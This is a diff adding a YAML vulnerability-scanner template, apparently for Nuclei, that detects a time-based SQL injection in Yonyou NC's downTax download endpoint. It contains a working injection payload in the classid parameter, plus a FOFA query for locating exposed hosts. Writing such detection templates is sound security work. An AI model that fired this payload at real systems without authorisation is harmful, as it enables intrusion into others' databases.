@@ -1,0 +1,28 @@
+id: yonyou-nc-downTax-sqli
+ 
+info:
+  name: Yonyou NC downTax - SQL Injection
+  author: HackTwo
+  severity: high
+  description: Detects SQL Injection vulnerability in Yonyou NC downTax.
+  metadata:
+    fofa-query: icon_hash="1085941792"
+  tags: yonyou,sqli
+ 
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        @timeout: 10s
+        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+ 
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
